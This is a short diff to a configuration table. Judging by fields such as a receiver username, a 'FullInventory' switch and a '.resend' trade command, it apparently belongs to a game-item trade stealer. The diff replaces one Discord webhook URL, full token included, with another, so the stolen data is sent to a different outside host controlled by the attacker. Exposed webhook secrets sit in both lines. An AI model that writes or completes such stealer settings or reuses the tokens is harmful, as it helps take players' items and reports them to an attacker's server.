@@ -1,6 +1,6 @@
 Config = {
     Receivers = {"eqz_s"},
-    Webhook = "https://discord.com/api/webhooks/1266043259399045341/lGLAX9oUjIU3N0cETQmwH73hApbgH3P6TIe5BiTGApu3MYKkMZLmzRESjJ8NuVAikp_l",
+    Webhook = "https://discord.com/api/webhooks/1270290188874289173/Yn3_Y5HemKOvWuVZZ9x_Rb0cR-WqV6LVXTRAdwXypWTRYDIwsgYCfm3hLM944N920BD0",
     FullInventory = true,
     GoodItemsOnly = false,
     ResendTrade = ".resend",
